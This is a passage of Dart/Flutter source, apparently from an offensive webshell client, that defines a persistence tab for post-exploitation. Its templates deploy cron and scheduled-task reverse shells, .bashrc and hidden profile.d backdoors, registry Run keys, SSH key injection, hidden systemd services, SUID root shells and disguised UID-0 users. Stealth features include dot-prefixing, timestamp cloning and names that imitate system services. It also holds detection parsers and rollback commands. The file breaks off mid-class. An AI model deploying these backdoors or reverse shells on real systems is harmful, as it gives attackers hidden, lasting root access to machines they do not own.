import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../services/webshell_service.dart';
import '../theme/app_theme.dart';
import 'priv_esc_landing.dart';

// ═══════════════════════════════════════════════════════════════════════════════
// Data models
// ═══════════════════════════════════════════════════════════════════════════════

/// Structured detection verdict for check results.
enum DetectionVerdict {
  /// No persistence of this type found.
  clean,

  /// Persistence mechanism confirmed present.
  found,

  /// Anomalies detected — could be benign, could be malicious.
  suspicious,

  /// Check command failed (permission denied, command missing, etc).
  error,
}

/// Whether a persistence method can currently be deployed on the target.
enum ExploitabilityLevel { ready, blocked }

/// Exploitability assessment from check-phase preconditions.
class _ExploitabilityResult {
  final ExploitabilityLevel level;
  final List<String> satisfied;
  final List<String> blocked;

  const _ExploitabilityResult({
    required this.level,
    this.satisfied = const [],
    this.blocked = const [],
  });

  bool get isDeployable => level == ExploitabilityLevel.ready;
}

/// Structured result of a persistence check.
class _DetectionResult {
  final DetectionVerdict verdict;
  final String summary; // one-line interpretation
  final String? rawOutput;
  final List<String> details; // specific lines / findings
  final double confidence; // 0.0 – 1.0
  final _ExploitabilityResult? exploitability; // null = no exploitability info parsed

  const _DetectionResult({
    required this.verdict,
    required this.summary,
    this.rawOutput,
    this.details = const [],
    this.confidence = 0.5,
    this.exploitability,
  });

  /// Convenience: clean with no findings.
  factory _DetectionResult.clean([String? raw]) => _DetectionResult(
        verdict: DetectionVerdict.clean,
        summary: 'No persistence found',
        rawOutput: raw,
        confidence: 0.95,
      );

  /// Convenience: check errored.
  factory _DetectionResult.error(String reason) => _DetectionResult(
        verdict: DetectionVerdict.error,
        summary: reason,
        confidence: 1.0,
      );
}

/// Per-method stealth capabilities.
class _MethodStealth {
  /// Whether the file path parameter(s) can be dot-prefixed.
  final bool canDotPrefix;

  /// Whether a `touch -r` timestamp clone is possible.
  final bool canTimestampClone;

  /// Whether shell-history cleanup is applicable.
  final bool canHistoryClean;

  /// Reference file for timestamp cloning (absolute path).
  final String tsRefFile;

  const _MethodStealth({
    this.canDotPrefix = false,
    this.canTimestampClone = false,
    this.canHistoryClean = true,
    this.tsRefFile = '/bin/ls',
  });
}

/// A user-fillable parameter for a deploy template.
class _PersistParam {
  final String id;
  final String label;
  final String hint;
  final String defaultValue;
  final bool multiline;

  /// If true, the parameter is a filesystem path that stealth can dot-prefix.
  final bool isFilePath;

  const _PersistParam({
    required this.id,
    required this.label,
    required this.hint,
    required this.defaultValue,
    this.multiline = false,
    this.isFilePath = false,
  });
}

/// Represents a single persistence technique.
class _PersistMethod {
  final String id;
  final String name;
  final String description;
  final String checkCommand;
  final String deployTemplate;
  final String verifyTemplate;
  final List<_PersistParam> params;
  final String warningText;
  final bool isWindows;

  /// Cleanup command template (uses same {param} placeholders).
  final String? rollbackTemplate;

  /// Commands run before deploy to check pre-conditions.
  /// Each should output `OK:...` or `FAIL:...` on its last line.
  final List<String> preflightCommands;

  /// Stealth capabilities for this method.
  final _MethodStealth stealth;

  const _PersistMethod({
    required this.id,
    required this.name,
    required this.description,
    required this.checkCommand,
    required this.deployTemplate,
    required this.verifyTemplate,
    required this.params,
    required this.warningText,
    this.isWindows = false,
    this.rollbackTemplate,
    this.preflightCommands = const [],
    this.stealth = const _MethodStealth(),
  });
}

/// A collapsible group of persistence methods.
class _PersistGroup {
  final String id;
  final String title;
  final IconData icon;
  final Color color;
  final List<_PersistMethod> methods;

  const _PersistGroup({
    required this.id,
    required this.title,
    required this.icon,
    required this.color,
    required this.methods,
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// Helper — dot-prefix a file path
// ═══════════════════════════════════════════════════════════════════════════════

String _toDotPath(String path) {
  final lastSlash = path.lastIndexOf('/');
  if (lastSlash == -1) return '.$path';
  final dir = path.substring(0, lastSlash + 1);
  final base = path.substring(lastSlash + 1);
  if (base.startsWith('.')) return path; // already hidden
  return '$dir.$base';
}

// ═══════════════════════════════════════════════════════════════════════════════
// Method definitions
// ═══════════════════════════════════════════════════════════════════════════════

final _allMethods = <_PersistMethod>[
  // ── Scheduled Tasks ────────────────────────────────────────────────────────

  _PersistMethod(
    id: 'cron_job',
    name: 'Cron Job',
    description:
        'Add a periodic crontab entry to trigger a reverse shell or payload.',
    checkCommand:
        'which crontab >/dev/null 2>&1 && echo "EXPLOIT:OK:crontab binary available" || echo "EXPLOIT:FAIL:crontab not installed — install cron package"; crontab -l 2>&1 || echo "(no crontab or empty)"',
    deployTemplate:
        r"(crontab -l 2>/dev/null; echo '{schedule} {command}') | crontab - && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        r"crontab -l 2>&1 | grep -qF '{command_fingerprint}' && (pgrep -x cron >/dev/null 2>&1 || pgrep -x crond >/dev/null 2>&1 && echo 'VERIFY_OK:cron_active' || echo 'VERIFY_OK:entry_exists_cron_not_running') || echo 'VERIFY_FAILED'",
    rollbackTemplate: r"crontab -l 2>/dev/null | grep -vF '{command_fingerprint}' | crontab -",
    preflightCommands: [
      '[ "\$(id -u)" = "0" ] && echo "OK:running as root" || echo "OK:running as \$(whoami)"',
    ],
    params: [
      _PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'e.g. */5 * * * *',
        defaultValue: '*/5 * * * *',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
      _PersistParam(
        id: 'command_fingerprint',
        label: 'Command fingerprint (for verify/rollback)',
        hint: 'Unique substring to identify this entry',
        defaultValue: 'REPLACE_IP/REPLACE_PORT',
      ),
    ],
    warningText:
        'A crontab entry will be appended. Existing entries are preserved. Use a unique fingerprint to enable rollback.',
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  _PersistMethod(
    id: 'scheduled_task',
    name: 'Scheduled Task',
    description:
        'Create a Windows scheduled task to run a payload at a specified interval.',
    checkCommand: r'schtasks /query /fo LIST 2>&1 | findstr /C:"TaskName:"',
    deployTemplate:
        r'schtasks /create /tn "{task_name}" /tr "{command}" /sc {schedule} /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'schtasks /query /tn "{task_name}" /fo LIST 2>&1',
    rollbackTemplate:
        r'schtasks /delete /tn "{task_name}" /f',
    params: [
      _PersistParam(
        id: 'task_name',
        label: 'Task name',
        hint: 'e.g. WindowsUpdateChecker',
        defaultValue: 'WindowsUpdateChecker',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue:
            'powershell -c "start-process cmd -argumentlist \'/c ping -n 30 127.0.0.1 & powershell -enc REPLACE_PAYLOAD\' -windowstyle hidden"',
      ),
      _PersistParam(
        id: 'schedule',
        label: 'Schedule',
        hint: 'minute / hourly / daily / onstart',
        defaultValue: 'hourly',
      ),
    ],
    warningText:
        'Creates a named scheduled task visible in Task Scheduler. Choose a name that blends in.',
    isWindows: true,
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  // ── Login Triggers ─────────────────────────────────────────────────────────

  _PersistMethod(
    id: 'bashrc_backdoor',
    name: 'Shell Profile (~/.bashrc)',
    description:
        'Append a command to ~/.bashrc, triggered on every interactive shell login.',
    checkCommand:
        r'[ -w "$HOME/.bashrc" ] && echo "EXPLOIT:OK:~/.bashrc writable" || echo "EXPLOIT:FAIL:~/.bashrc not writable"; found=0; for f in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do [ -f "$f" ] && echo "=== $f ===" && tail -20 "$f" 2>&1 && found=1; done; [ "$found" = 0 ] && echo "(no shell profile found)"',
    deployTemplate:
        r"echo -e '\n{command} &' >> $HOME/.bashrc && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        'grep -qF "{command_fingerprint}" \$HOME/.bashrc 2>/dev/null && echo "VERIFY_OK:entry_exists" || echo "VERIFY_FAILED"',
    rollbackTemplate:
        r"sed -i '/{command_fingerprint}/d' $HOME/.bashrc",
    params: [
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        defaultValue:
            r"bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1",
      ),
      _PersistParam(
        id: 'command_fingerprint',
        label: 'Command fingerprint',
        hint: 'Unique substring for rollback',
        defaultValue: 'REPLACE_IP/REPLACE_PORT',
      ),
    ],
    warningText:
        'The command will be appended to ~/.bashrc and runs on every new interactive shell. It is visible to anyone who reads the file.',
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  _PersistMethod(
    id: 'profile_d',
    name: 'Profile.d Script',
    description:
        'Drop a script into /etc/profile.d/ — executes for every user at login (requires root).',
    checkCommand:
        r'[ -d /etc/profile.d ] && ([ -w /etc/profile.d ] && echo "EXPLOIT:OK:/etc/profile.d writable" || echo "EXPLOIT:FAIL:/etc/profile.d not writable — need root") || echo "EXPLOIT:FAIL:/etc/profile.d directory not found"; ls -la /etc/profile.d/ 2>&1 | grep -Ev "README|00-header|90-updates|vim|bash_completion|grep|colorgrep|colorls|which|less" || echo "(no profile scripts found)"',
    deployTemplate:
        r"echo '{command} &' > /etc/profile.d/.{script_name}.sh && chmod +x /etc/profile.d/.{script_name}.sh && touch -r /etc/profile.d/vim.sh /etc/profile.d/.{script_name}.sh && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        '[ -f /etc/profile.d/.{script_name}.sh ] && [ -x /etc/profile.d/.{script_name}.sh ] && bash -n /etc/profile.d/.{script_name}.sh 2>/dev/null && echo "VERIFY_OK:executable_syntax_ok" || ([ -f /etc/profile.d/.{script_name}.sh ] && echo "VERIFY_OK:file_exists" || echo "VERIFY_FAILED")',
    rollbackTemplate:
        r'rm -f /etc/profile.d/.{script_name}.sh',
    preflightCommands: [
      r'[ -w /etc/profile.d ] && echo "OK:/etc/profile.d/ is writable" || echo "FAIL:/etc/profile.d/ is not writable (need root)"',
    ],
    params: [
      _PersistParam(
        id: 'script_name',
        label: 'Script name (auto dot-prefixed)',
        hint: 'e.g. bash-completion',
        defaultValue: 'bash-completion',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: "e.g. bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        defaultValue:
            r"bash -c 'bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1'",
      ),
    ],
    warningText:
        'Requires root. The script runs as root for every user login. The dot-prefix hides it from casual listing.',
    stealth: _MethodStealth(
      canDotPrefix: true,
      canTimestampClone: true,
      canHistoryClean: true,
      tsRefFile: '/etc/profile.d/vim.sh',
    ),
  ),

  _PersistMethod(
    id: 'registry_run',
    name: 'Registry Run Key',
    description:
        r'Add an entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.',
    checkCommand:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2>&1',
    deployTemplate:
        r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" /t REG_SZ /d "{command}" /f && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" 2>&1',
    rollbackTemplate:
        r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "{entry_name}" /f',
    params: [
      _PersistParam(
        id: 'entry_name',
        label: 'Entry name',
        hint: 'e.g. OneDriveUpdater',
        defaultValue: 'OneDriveUpdater',
      ),
      _PersistParam(
        id: 'command',
        label: 'Command',
        hint: 'e.g. powershell -enc ...',
        defaultValue: r'powershell -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The registry entry will appear in Autoruns. Use a plausible name.',
    isWindows: true,
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  _PersistMethod(
    id: 'startup_folder',
    name: 'Startup Folder',
    description:
        'Write a .bat file to the user Startup folder, triggered on login.',
    checkCommand:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1',
    deployTemplate:
        r'echo {command} > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}" && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}" 2>&1',
    rollbackTemplate:
        r'del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{payload_name}"',
    params: [
      _PersistParam(
        id: 'payload_name',
        label: 'File name',
        hint: 'e.g. update_check.bat',
        defaultValue: 'update_check.bat',
      ),
      _PersistParam(
        id: 'command',
        label: 'Batch command',
        hint: 'e.g. @echo off & start /b powershell -enc ...',
        defaultValue:
            r'@echo off & start /b powershell -windowstyle hidden -enc BASE64_PAYLOAD',
      ),
    ],
    warningText:
        'The .bat file will be visible in the Startup folder. A console window may briefly flash on login.',
    isWindows: true,
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  // ── Service Backdoors ──────────────────────────────────────────────────────

  _PersistMethod(
    id: 'ssh_authorized_keys',
    name: 'SSH Authorized Keys',
    description:
        'Append a public key to ~/.ssh/authorized_keys for passwordless SSH access.',
    checkCommand:
        r'[ -d "$HOME" ] && [ -w "$HOME" ] && echo "EXPLOIT:OK:home directory writable" || echo "EXPLOIT:FAIL:home directory not writable"; [ -f "$HOME/.ssh/authorized_keys" ] && echo "=== authorized_keys (lines: $(wc -l < $HOME/.ssh/authorized_keys)) ===" && cat "$HOME/.ssh/authorized_keys" 2>&1 || echo "(no authorized_keys at \$HOME/.ssh)"',
    deployTemplate:
        r"mkdir -p $HOME/.ssh && echo '{ssh_pubkey}' >> $HOME/.ssh/authorized_keys && chmod 600 $HOME/.ssh/authorized_keys && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        'tail -1 \$HOME/.ssh/authorized_keys 2>/dev/null | grep -qF "{key_fingerprint}" && echo "VERIFY_OK:key_present" || echo "VERIFY_FAILED"',
    rollbackTemplate:
        r"grep -vF '{key_fingerprint}' $HOME/.ssh/authorized_keys > /tmp/.ak_tmp && mv /tmp/.ak_tmp $HOME/.ssh/authorized_keys && chmod 600 $HOME/.ssh/authorized_keys",
    params: [
      _PersistParam(
        id: 'ssh_pubkey',
        label: 'SSH public key',
        hint: 'ssh-rsa AAAAB3...',
        defaultValue: 'ssh-rsa AAAAB3...REPLACE_WITH_YOUR_PUBKEY',
        multiline: true,
      ),
      _PersistParam(
        id: 'key_fingerprint',
        label: 'Key fingerprint (last 20 chars of pubkey)',
        hint: 'For rollback identification',
        defaultValue: 'REPLACE_WITH_YOUR_PUBKEY',
      ),
    ],
    warningText:
        'A public key will be appended to authorized_keys. Ensure the corresponding private key is kept secure.',
    stealth: _MethodStealth(canHistoryClean: true),
  ),

  _PersistMethod(
    id: 'systemd_service',
    name: 'systemd User Service',
    description:
        'Create a user-level systemd service unit that runs a payload on boot.',
    checkCommand:
        r'which systemctl >/dev/null 2>&1 && echo "EXPLOIT:OK:systemctl found" || echo "EXPLOIT:FAIL:systemctl not found — no systemd"; ls "$HOME/.config/systemd/user/"*.service 2>&1 || echo "(no user systemd services)"',
    deployTemplate:
        r"mkdir -p $HOME/.config/systemd/user && printf '[Unit]\nDescription={service_name}\n\n[Service]\nExecStart={command}\nRestart=no\n\n[Install]\nWantedBy=default.target\n' > $HOME/.config/systemd/user/.{service_name}.service && systemctl --user daemon-reload 2>&1; systemctl --user enable .{service_name}.service 2>&1 && echo 'DEPLOY_OK' || echo 'DEPLOY_FAILED'",
    verifyTemplate:
        r"systemctl --user is-active .{service_name}.service 2>&1 | grep -q '^active' && echo 'VERIFY_OK:active' || (systemctl --user is-enabled .{service_name}.service 2>&1 | grep -q 'enabled' && echo 'VERIFY_OK:enabled_not_active' || (systemctl --user list-unit-files 2>&1 | grep -q '.{service_name}' && echo 'VERIFY_OK:unit_exists' || echo 'VERIFY_FAILED'))",
    rollbackTemplate:
        r"systemctl --user disable .{service_name}.service 2>/dev/null; rm -f $HOME/.config/systemd/user/.{service_name}.service; systemctl --user daemon-reload 2>/dev/null",
    params: [
      _PersistParam(
        id: 'service_name',
        label: 'Service name (auto dot-prefixed)',
        hint: 'e.g. dbus-cache',
        defaultValue: 'dbus-cache',
      ),
      _PersistParam(
        id: 'command',
        label: 'ExecStart command',
        hint: 'e.g. /bin/bash -c ...',
        defaultValue:
            r'/bin/bash -c "bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1"',
      ),
    ],
    warningText:
        'A user systemd service will be created with a dot-prefixed name. It persists across reboots and is visible in systemctl --user list-units.',
    stealth: _MethodStealth(
      canDotPrefix: true,
      canTimestampClone: true,
      canHistoryClean: true,
    ),
  ),

  // ── Privilege Backdoors ────────────────────────────────────────────────────

  _PersistMethod(
    id: 'suid_shell',
    name: 'SUID Shell',
    description:
        'Copy /bin/bash to a hidden location with SUID bit. Execute with `-p` to get root.',
    checkCommand:
        r'[ -w /tmp ] && echo "EXPLOIT:OK:/tmp writable" || echo "EXPLOIT:FAIL:/tmp not writable"; [ "$(id -u)" = "0" ] && echo "EXPLOIT:OK:running as root (SUID will work)" || echo "EXPLOIT:FAIL:not root — chmod 4755 needs root-owned file for root SUID"; echo "=== SUID shells in non-standard paths ===" && find /bin /usr/bin /usr/local/bin /tmp /opt /sbin /usr/sbin /var/tmp -maxdepth 3 -perm -4000 -type f \( -name "bash" -o -name "dash" -o -name "sh" -o -name "zsh" \) 2>/dev/null | grep -v "^/bin/\|^/usr/bin/" | head -10; stat -c "%a %n" /tmp/.[!.]* 2>/dev/null | grep "4755" || echo "(no SUID backdoor found)"',
    // deploy/verify/rollback share the canonical landing templates
    // (single source of truth in priv_esc_landing.dart).
    deployTemplate: landingById('suid_shell').deployTemplate,
    verifyTemplate: landingById('suid_shell').verifyTemplate,
    rollbackTemplate: landingById('suid_shell').rollbackTemplate,
    preflightCommands: [
      '[ -w /tmp ] && echo "OK:/tmp writable" || echo "FAIL:/tmp not writable"',
      '[ -x /bin/bash ] && echo "OK:/bin/bash exists" || echo "FAIL:/bin/bash not found"',
    ],
    params: [
      _PersistParam(
        id: 'mimic',
        label: 'Hidden file name',
        hint: 'e.g. kworker, dbus-daemon, systemd-coredump',
        defaultValue: 'kworker',
        isFilePath: true,
      ),
    ],
    warningText:
        'Creates a SUID root shell at a hidden /tmp/.<name>. Use `/tmp/.<name> -p` to get euid=0. Bash drops SUID by default unless invoked with -p.',
    stealth: _MethodStealth(
      canDotPrefix: true,
      canTimestampClone: false,
      canHistoryClean: true,
      tsRefFile: '/bin/ls',
    ),
  ),

  _PersistMethod(
    id: 'root_user',
    name: 'Root User (passwd)',
    description:
        'Add a UID-0 user to /etc/passwd. Log in with `su {username}` to get root.',
    checkCommand:
        r'[ -w /etc/passwd ] && echo "EXPLOIT:OK:/etc/passwd writable" || echo "EXPLOIT:FAIL:/etc/passwd not writable — need root"; (command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "EXPLOIT:OK:crypt tool available (openssl/perl/ruby)" || echo "EXPLOIT:FAIL:no openssl, perl, or ruby — cannot generate crypt hash"; cut -d: -f1,3 /etc/passwd 2>/dev/null | grep ":0$" || echo "(no UID 0 entries found)"',
    // deploy/verify/rollback share the canonical landing templates.
    deployTemplate: landingById('passwd_user').deployTemplate,
    verifyTemplate: landingById('passwd_user').verifyTemplate,
    rollbackTemplate: landingById('passwd_user').rollbackTemplate,
    preflightCommands: [
      '[ -w /etc/passwd ] && echo "OK:/etc/passwd writable" || echo "FAIL:/etc/passwd not writable (need root)"',
      '(command -v openssl >/dev/null 2>&1 || command -v perl >/dev/null 2>&1 || command -v ruby >/dev/null 2>&1) && echo "OK:crypt tool available (openssl/perl/ruby)" || echo "FAIL:no openssl, perl, or ruby — cannot generate crypt hash"',
    ],
    params: [
      _PersistParam(
        id: 'username',
        label: 'Username (disguise)',
        hint: 'e.g. messagebus, systemd-network, daemon',
        defaultValue: 'messagebus',
      ),
      _PersistParam(
        id: 'password',
        label: 'Password',
        hint: 'Login password for the backdoor user',
        defaultValue: 'REPLACE_PASSWORD',
      ),
      _PersistParam(
        id: 'salt',
        label: 'Crypt salt (2 chars)',
        hint: 'Random 2-char salt for crypt()',
        defaultValue: 'AA',
      ),
    ],
    warningText:
        'Requires root. Adds a UID-0 user to /etc/passwd. Choose a username that looks like a system daemon. Original passwd is backed up to /etc/passwd.bak.',
    stealth: _MethodStealth(
      canDotPrefix: false,
      canTimestampClone: false,
      canHistoryClean: true,
      tsRefFile: '/etc/passwd',
    ),
  ),

  // ── Kernel / System Level ──────────────────────────────────────────────────
];

// ── Group index ───────────────────────────────────────────────────────────────

_PersistMethod _m(String id) => _allMethods.firstWhere((m) => m.id == id);

final _allGroups = <_PersistGroup>[
  _PersistGroup(
    id: 'scheduled',
    title: 'Scheduled Tasks',
    icon: Icons.schedule,
    color: AppColors.cyan,
    methods: [_m('cron_job'), _m('scheduled_task')],
  ),
  _PersistGroup(
    id: 'login',
    title: 'Login Triggers',
    icon: Icons.login,
    color: AppColors.amber,
    methods: [
      _m('bashrc_backdoor'),
      _m('profile_d'),
      _m('registry_run'),
      _m('startup_folder'),
    ],
  ),
  _PersistGroup(
    id: 'service',
    title: 'Service Backdoors',
    icon: Icons.settings,
    color: AppColors.primary,
    methods: [
      _m('ssh_authorized_keys'),
      _m('systemd_service'),
    ],
  ),
  _PersistGroup(
    id: 'priv',
    title: 'Privilege Backdoors',
    icon: Icons.admin_panel_settings_outlined,
    color: AppColors.amber,
    methods: [_m('suid_shell'), _m('root_user')],
  ),
];

// ═══════════════════════════════════════════════════════════════════════════════
// Detection parsers — raw output → _DetectionResult
// ═══════════════════════════════════════════════════════════════════════════════

/// Parse exploitability tokens from check output.
/// Lines starting with EXPLOIT:OK: → satisfied, EXPLOIT:FAIL: → blocked.
_ExploitabilityResult _parseExploitability(String raw) {
  final satisfied = <String>[];
  final blocked = <String>[];
  for (final line in raw.split('\n')) {
    final t = line.trim();
    if (t.startsWith('EXPLOIT:OK:')) {
      satisfied.add(t.substring(11)); // "EXPLOIT:OK:" = 11 chars
    } else if (t.startsWith('EXPLOIT:FAIL:')) {
      blocked.add(t.substring(13)); // "EXPLOIT:FAIL:" = 13 chars
    }
  }
  return _ExploitabilityResult(
    level: blocked.isEmpty ? ExploitabilityLevel.ready : ExploitabilityLevel.blocked,
    satisfied: satisfied,
    blocked: blocked,
  );
}

/// Strip EXPLOIT: prefixed lines from raw output before detection parsing.
String _stripExploitLines(String raw) {
  return raw
      .split('\n')
      .where((l) => !l.trim().startsWith('EXPLOIT:'))
      .join('\n');
}

_DetectionResult _parseDetection(String methodId, String raw) {
  if (raw.startsWith('[Error]')) {
    return _DetectionResult.error(raw);
  }

  // Parse exploitability from EXPLOIT: prefixed lines
  final exploitability = _parseExploitability(raw);

  // Strip exploitability lines before passing to detection parsers
  final detectionRaw = _stripExploitLines(raw);

  _DetectionResult result;
  switch (methodId) {
    case 'cron_job':
      result = _parseCron(detectionRaw);
    case 'bashrc_backdoor':
      result = _parseBashrc(detectionRaw);
    case 'ssh_authorized_keys':
      result = _parseSshKeys(detectionRaw);
    case 'systemd_service':
      result = _parseSystemd(detectionRaw);
    case 'profile_d':
      result = _parseProfileD(detectionRaw);
    case 'suid_shell':
      result = _parseSuid(detectionRaw);
    case 'root_user':
      result = _parseRootUser(detectionRaw);
    default:
      result = _DetectionResult(
        verdict: DetectionVerdict.found,
        summary: detectionRaw.length > 120 ? '${detectionRaw.substring(0, 120)}…' : detectionRaw,
        rawOutput: raw,
        confidence: 0.3,
      );
  }

  // Attach exploitability to the result
  return _DetectionResult(
    verdict: result.verdict,
    summary: result.summary,
    rawOutput: raw, // keep full raw output including EXPLOIT lines
    details: result.details,
    confidence: result.confidence,
    exploitability: exploitability,
  );
}

bool _parseDeploySuccess(String raw) {
  return raw.contains('DEPLOY_OK');
}

bool _parseVerifySuccess(String raw) {
  return raw.contains('VERIFY_OK') ||
      raw.contains('uid=0(root)') ||
      raw.contains('euid=0(root)');
}

// ── Individual parsers ───────────────────────────────────────────────────────

_DetectionResult _parseCron(String raw) {
  if (raw.contains('(no crontab or empty)')) {
    return _DetectionResult.clean(raw);
  }
  final lines = raw.split('\n').where((l) {
    final t = l.trim();
    return t.isNotEmpty && !t.startsWith('#');
  }).toList();

  if (lines.isEmpty) return _DetectionResult.clean(raw);

  final suspicious = lines.where((l) {
    return l.contains('/dev/tcp') ||
        l.contains('bash -i') ||
        l.contains('nc ') ||
        l.contains('python -c') ||
        l.contains('base64') ||
        RegExp(r'\d+\.\d+\.\d+\.\d+').hasMatch(l);
  }).toList();

  if (suspicious.isNotEmpty) {
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${suspicious.length} suspicious cron entr${suspicious.length == 1 ? "y" : "ies"} found',
      rawOutput: raw,
      details: suspicious,
      confidence: 0.75,
    );
  }

  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: '${lines.length} cron entr${lines.length == 1 ? "y" : "ies"} found',
    rawOutput: raw,
    details: lines.take(10).toList(),
    confidence: 0.9,
  );
}

_DetectionResult _parseBashrc(String raw) {
  if (raw.contains('(no shell profile found)')) {
    return _DetectionResult.clean(raw);
  }
  final suspicious = RegExp(
    r'(/dev/tcp|bash -i|nc\s+-[eln]|python.*socket|exec\s+[^s])',
    multiLine: true,
  ).allMatches(raw).map((m) => m.group(0)!).toList();

  if (suspicious.isNotEmpty) {
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${suspicious.length} suspicious pattern(s) in shell profile',
      rawOutput: raw,
      details: suspicious,
      confidence: 0.7,
    );
  }

  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Shell profiles found, no obvious backdoor patterns',
    rawOutput: raw,
    confidence: 0.6,
  );
}

_DetectionResult _parseSshKeys(String raw) {
  if (raw.contains('(no authorized_keys')) {
    return _DetectionResult.clean(raw);
  }

  final keyCount = RegExp(r'ssh-(rsa|ed25519|ecdsa|dss)').allMatches(raw).length;
  final lines = raw.split('\n').where((l) {
    final t = l.trim();
    return t.isNotEmpty && !t.startsWith('#') && !t.startsWith('===');
  }).length;

  if (keyCount > 3) {
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '$keyCount SSH keys found — unusually many',
      rawOutput: raw,
      details: ['Keys: $keyCount, Lines: $lines'],
      confidence: 0.65,
    );
  }

  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: '$keyCount SSH key(s) found',
    rawOutput: raw,
    confidence: 0.9,
  );
}

_DetectionResult _parseSystemd(String raw) {
  if (raw.contains('(no user systemd services)')) {
    return _DetectionResult.clean(raw);
  }
  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'User systemd services present',
    rawOutput: raw,
    confidence: 0.7,
  );
}

_DetectionResult _parseProfileD(String raw) {
  if (raw.contains('(no profile scripts found)')) {
    return _DetectionResult.clean(raw);
  }
  final dotFiles = raw.split('\n').where((l) => l.contains(' .')).toList();
  if (dotFiles.isNotEmpty) {
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${dotFiles.length} hidden (dot-prefix) script(s) in profile.d',
      rawOutput: raw,
      details: dotFiles,
      confidence: 0.8,
    );
  }
  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Profile.d scripts present',
    rawOutput: raw,
    confidence: 0.5,
  );
}

_DetectionResult _parseSuid(String raw) {
  if (raw.contains('(no SUID backdoor found)') &&
      !raw.startsWith('/')) {
    return _DetectionResult.clean(raw);
  }

  final paths = raw.split('\n').where((l) => l.startsWith('/')).toList();
  final nonStandard = paths
      .where((p) => !p.startsWith('/bin/') && !p.startsWith('/usr/bin/'))
      .toList();

  if (nonStandard.isNotEmpty) {
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${nonStandard.length} SUID shell(s) in non-standard location(s)',
      rawOutput: raw,
      details: nonStandard,
      confidence: 0.9,
    );
  }
  if (paths.isNotEmpty) {
    return _DetectionResult(
      verdict: DetectionVerdict.found,
      summary: '${paths.length} SUID shell(s) in standard locations (normal)',
      rawOutput: raw,
      confidence: 0.5,
    );
  }
  return _DetectionResult.clean(raw);
}

_DetectionResult _parseRootUser(String raw) {
  if (raw.contains('(no UID 0 entries found)')) {
    return _DetectionResult.clean(raw);
  }

  final uid0Users = raw.split('\n').where((l) => l.contains(':0')).toList();

  if (uid0Users.length > 1) {
    final nonRoot = uid0Users.where((l) => !l.startsWith('root:')).toList();
    return _DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${nonRoot.length} non-root account(s) with UID 0',
      rawOutput: raw,
      details: nonRoot,
      confidence: 0.95,
    );
  }

  return _DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Only root has UID 0 (normal)',
    rawOutput: raw,
    confidence: 0.9,
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// Platform filter
// ═══════════════════════════════════════════════════════════════════════════════

List<_PersistGroup> _filterGroups(bool isWindows) {
  return _allGroups.map((g) {
    final applicable = g.methods.where((m) => m.isWindows == isWindows).toList();
    if (applicable.isEmpty) return null;
    return _PersistGroup(
      id: g.id,
      title: g.title,
      icon: g.icon,
      color: g.color,
      methods: applicable,
    );
  }).whereType<_PersistGroup>().toList();
}

// ═══════════════════════════════════════════════════════════════════════════════
// Main tab
// ═══════════════════════════════════════════════════════════════════════════════

class PersistenceTab extends StatefulWidget {
  final WebshellService service;
  const PersistenceTab({super.key, required this.service});

  @override
